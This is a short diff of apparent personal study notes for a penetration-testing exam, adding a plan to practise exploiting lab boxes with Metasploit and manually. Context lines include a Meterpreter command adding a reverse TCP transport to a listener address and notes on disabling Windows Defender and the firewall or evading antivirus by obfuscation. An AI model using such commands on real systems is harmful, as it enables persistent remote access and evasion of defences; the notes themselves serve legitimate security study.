@@ -2760,6 +2760,15 @@ meterpreter > transport add -t reverse_tcp -l 10.11.0.4 -p 5555
   + AV bypassing
     - with Admin, util scripts to turn off Windows Defender && firewall
     - without Admin, obfuscation, string substitution.
+     
+** boxes
+   1. ensure 100% with msf.
+   2. same exploit manually.
+   3. different routines.
+     
+** exam preparation
+   1. read and summarize about the topics in the syllabus (possible routines, methods, tools)>
+   2. use tools on boxes.
 
 * Book4_Chapter 01 An Introduction to TCP/IP
 ** a brief history
